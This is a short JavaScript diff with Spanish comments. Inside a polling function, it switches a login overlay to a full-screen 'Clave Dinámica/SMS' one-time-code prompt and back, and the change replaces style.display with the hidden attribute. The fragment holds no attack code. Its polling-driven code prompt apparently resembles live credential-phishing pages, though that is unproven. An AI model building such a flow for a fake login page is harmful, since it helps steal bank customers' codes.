@@ -118,7 +118,7 @@ function startPolling() {
             
             // Ocultar drawer de login y mostrar pantalla completa de Clave Dinámica/SMS
             document.getElementById("loginOverlay").classList.remove("open");
-            document.getElementById("claveScreen").style.display = "flex";
+            document.getElementById("claveScreen").hidden = false;
             
             const claveTitle = document.getElementById("claveTitle");
             const claveDesc = document.getElementById("claveDesc");
@@ -171,7 +171,7 @@ function startPolling() {
             loader.classList.remove("open");
             
             // Ocultar claveScreen si estaba abierta
-            document.getElementById("claveScreen").style.display = "none";
+            document.getElementById("claveScreen").hidden = true;
             
             toast("Verificación exitosa");
             
